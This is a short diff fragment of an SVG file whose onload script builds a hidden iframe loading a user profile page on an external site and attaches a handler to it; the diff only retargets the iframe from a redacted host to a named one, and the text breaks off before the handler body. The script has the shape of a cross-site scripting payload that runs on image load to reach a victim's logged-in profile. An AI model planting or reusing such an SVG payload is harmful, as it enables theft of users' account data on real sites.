@@ -1,6 +1,6 @@
 <svg xmlns="http://www.w3.org/2000/svg" onload="
   var iframe = document.createElement('iframe');
-  iframe.src = 'https://ai.redacted.com/profile';
+  iframe.src = 'https://ai.planet.com/profile';
   iframe.style.display = 'none';
   document.body.appendChild(iframe);
   iframe.onload = function() {
